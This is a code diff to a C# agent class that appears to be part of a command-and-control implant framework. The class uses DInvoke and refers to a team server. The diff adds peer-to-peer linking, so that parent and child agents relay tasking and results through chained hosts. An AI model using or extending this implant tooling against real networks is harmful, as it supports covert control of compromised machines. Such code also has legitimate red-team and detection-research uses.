@@ -11,6 +11,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using WinAPI.DInvoke;
 using BinarySerializer;
+using System.Diagnostics;
 
 namespace Agent
 {
@@ -26,7 +27,7 @@ namespace Agent
 
         public readonly Dictionary<string, CancellationTokenSource> TaskTokens = new Dictionary<string, CancellationTokenSource>();
 
-        private CancellationTokenSource _tokenSource = new CancellationTokenSource();
+        public CancellationTokenSource TokenSource { get; private set; } = new CancellationTokenSource();
 
         private List<AgentCommand> _commands = new List<AgentCommand>();
 
@@ -49,7 +50,7 @@ namespace Agent
             var self = Assembly.GetExecutingAssembly();
             foreach (var type in self.GetTypes())
             {
-                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters)
+                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters && !type.IsAbstract)
                 {
                     var instance = Activator.CreateInstance(type) as AgentCommand;
                     _commands.Add(instance);
@@ -62,6 +63,7 @@ namespace Agent
         {
             this.MetaData = metadata;
             this.MasterCommunicator = communicator;
+            this.MasterCommunicator.FrameReceived += MasterCommunicator_FrameReceived;
             this._networkService = ServiceProvider.GetService<INetworkService>();
             this._fileService = ServiceProvider.GetService<IFileService>();
             //this._proxyService = ServiceProvider.GetService<IProxyService>();
@@ -71,17 +73,32 @@ namespace Agent
             LoadCommands();
 
 
-            communicator.Init(this);
+            this.MasterCommunicator.Init(this);
+        }
+
+        private async Task MasterCommunicator_FrameReceived(NetFrame frame)
+        {
+            await this.HandleFrame(frame);
+        }
+
+        public async void RunCommunicators()
+        {
+            while (!this.TokenSource.IsCancellationRequested)
+            {
+                await this.MasterCommunicator.Start();
+                await this.MasterCommunicator.Run();
+            }
+            
         }
 
         public void Run()
         {
-            Thread commThread = new Thread(this.MasterCommunicator.Start);
-            commThread.Start(this._tokenSource);
+            Thread commThread = new Thread(RunCommunicators);
+            commThread.Start();
 
             try
             {
-                while (!_tokenSource.IsCancellationRequested)
+                while (!TokenSource.IsCancellationRequested)
                 {
                     if (ShouldStop)
                     {
@@ -90,7 +107,7 @@ namespace Agent
                             comm.DoCheckIn().Wait();
                         this.Stop();
                     }
-                    this.HandleFrames().Wait();
+
                     Thread.Sleep(10);
                 }
             }
@@ -114,22 +131,57 @@ namespace Agent
 
         public void Stop()
         {
-            this._tokenSource.Cancel();
-        }
-
-        private async Task HandleFrames()
-        {
-            //frames to handle for this agent
-            var frames = this._networkService.GetFrames(this.MetaData.Id);
-            foreach (var frame in frames)
-                await this.HandleFrame(frame);
-
+            this.TokenSource.Cancel();
         }
 
         private async Task HandleFrame(NetFrame frame)
         {
+            //Handles frames comming from MasterCommunicator
+
+#if DEBUG
+            Debug.WriteLine($"Handling {frame.FrameType} frame!");
+#endif
+
+            if (frame.FrameType == NetFrameType.Link) //handled here because frame destination is not set
+            {
+
+                var link = this._frameService.GetData<LinkInfo>(frame);
+                await HandleLinkNotification(link);
+                return;
+            }
+
+
+            //Relay frames to childrens
+            if (frame.Destination != this.MetaData.Id)
+            {
+
+                if (!this._relaysComm.ContainsKey(frame.Destination))
+                {
+#if DEBUG
+                    Debug.WriteLine($"No relay with ID {frame.Destination} found !");
+#endif  
+                }
+                else
+                {
+                    var child = this._relaysComm[frame.Destination];
+                    await child.SendFrame(frame);
+                }
+                return;
+            }
+
+            //Handle Frame
             switch (frame.FrameType)
             {
+                case NetFrameType.Link:
+                    {
+
+                        break;
+                    }
+                case NetFrameType.Unlink:
+                    {
+
+                        break;
+                    }
                 case NetFrameType.CheckIn:
                 case NetFrameType.TaskResult:
                     break;
@@ -146,6 +198,21 @@ namespace Agent
                     throw new ArgumentOutOfRangeException();
             }
         }
+
+        private async Task HandleLinkNotification(LinkInfo link)
+        {
+            // this is sent from the parent
+            // which means this is the child
+            link.ChildId = this.MetaData.Id;
+
+            // send to team server
+            await this.SendFrame(this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.Link, link));
+            await this.SendMetaData();
+
+            if (this._relaysComm.Any())
+                await this.SendRelays();
+        }
+
 
         private async Task HandleTask(AgentTask task)
         {
@@ -254,16 +321,28 @@ namespace Agent
             }
         }
 
+
+
+        public async Task SendFrame(NetFrame frame)
+        {
+            await this.MasterCommunicator.SendFrame(frame);
+        }
+
+        public async Task SendRelays()
+        {
+            List<string> relaysIds = _relaysComm.Select(kvp => kvp.Key).ToList();
+            await this.SendFrame(this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.LinkRelay, relaysIds));
+        }
         public async Task SendMetaData()
         {
             var frame = this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.CheckIn, await this.MetaData.BinarySerializeAsync());
-            this._networkService.EnqueueFrame(frame);
+            await SendFrame(frame);
         }
 
         public async Task SendTaskResult(AgentTaskResult result)
         {
             var frame = this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.TaskResult, await result.BinarySerializeAsync());
-            this._networkService.EnqueueFrame(frame);
+            await SendFrame(frame);
         }
 
         public async Task SendTaskError(string taskId, string errorMessage)
@@ -286,6 +365,125 @@ namespace Agent
             };
             await SendTaskResult(result);
         }
+
+        //private async Task HandleLinkNotification(LinkNotification link)
+        //{
+        //    // this is sent from the parent
+        //    // which means this is the child
+        //    link.ChildId = _metadata.Id;
+
+        //    // send to team server
+        //    await SendC2Frame(new C2Frame(_metadata.Id, FrameType.LINK, Crypto.Encrypt(link)));
+        //}
+
+        public async Task<bool> AddChildCommModule(string taskId, P2PCommunicator commModule)
+        {
+            commModule.Init(this);
+
+            commModule.FrameReceived += OnFrameReceivedFromChild;
+            commModule.OnException += async () =>
+            {
+                await this.RemoveChildCommModule(commModule);
+            };
+
+            try
+            {
+                // blocks until connected
+                await commModule.Start();
+            }
+            catch (TaskCanceledException ex)
+            {
+                return false;
+            }
+
+            // send a link frame to the child
+            var link = new LinkInfo(taskId, this.MetaData.Id);
+            var frame = this._frameService.CreateFrame(this.MetaData.Id, taskId, NetFrameType.Link, link);
+            await commModule.SendFrame(frame);
+
+            // add to the dict using the task id
+            _childrenComm.Add(taskId, commModule);
+            _ = commModule.Run();
+
+            return true;
+        }
+
+        public async Task RemoveChildCommModule(P2PCommunicator commModule)
+        {
+            commModule.FrameReceived -= OnFrameReceivedFromChild;
+            commModule.OnException -= async () =>
+            {
+                await this.RemoveChildCommModule(commModule);
+            };
+
+            await commModule.Stop();
+
+            var childId = _childrenComm.FirstOrDefault(kvp => kvp.Value == commModule).Key;
+            _childrenComm.Remove(childId);
+            List<string> relaysIds = _relaysComm.Where(kvp => kvp.Value == commModule).Select(kvp => kvp.Key).ToList();
+            foreach (var relayId in relaysIds)
+                _relaysComm.Remove(relayId);
+
+            // send an unlink
+            await SendFrame(this._frameService.CreateFrame(this.MetaData.Id, NetFrameType.Unlink, new LinkInfo() { ParentId = this.MetaData.Id, ChildId = childId }));
+            await SendRelays();
+        }
+
+        private async Task OnFrameReceivedFromChild(NetFrame frame)
+        {
+            if (frame.FrameType == NetFrameType.Link)
+            {
+                var link = _frameService.GetData<LinkInfo>(frame);
+
+                // we are the parent
+                if (link.ParentId.Equals(this.MetaData.Id))
+                {
+                    // update key to the child metadata
+                    if (_childrenComm.TryGetValue(link.TaskId, out var commModule))
+                    {
+                        _childrenComm.Remove(link.TaskId);
+                        _childrenComm.Add(link.ChildId, commModule);
+                        _relaysComm.Add(link.ChildId, commModule);
+                    }
+                }
+
+                //Child send a new Link frame => sending relay frame
+                await SendRelays();
+            }
+
+            if (frame.FrameType == NetFrameType.LinkRelay) //update relays
+            {
+                var relays = _frameService.GetData<List<string>>(frame);
+                if (_relaysComm.ContainsKey(frame.Source))
+                {
+                    var comm = _relaysComm[frame.Source];
+                    //remove existing relays excpet child
+                    foreach (var key in _relaysComm.Where(kvp => kvp.Value == comm && kvp.Key != frame.Source).Select(kvp => kvp.Key).ToList())
+                        _relaysComm.Remove(key);
+                    //add relays
+                    foreach (var relayId in relays)
+                        _relaysComm.Add(relayId, comm);
+                }
+
+                //Send relay update info
+                await SendRelays();
+                return; //don't want this frame to chain 
+            }
+
+            // send it outbound
+            await SendFrame(frame);
+        }
+
+        private readonly Dictionary<string, P2PCommunicator> _childrenComm = new Dictionary<string, P2PCommunicator>();
+        public Dictionary<string, P2PCommunicator> ChildrenCommModules
+        {
+            get
+            {
+                return this._childrenComm;
+            }
+        }
+
+        private readonly Dictionary<string, P2PCommunicator> _relaysComm = new Dictionary<string, P2PCommunicator>();
 
         /*public Thread HandleTask(AgentTask task, AgentTaskResult res = null, AgentCommandContext parent = null)
         {
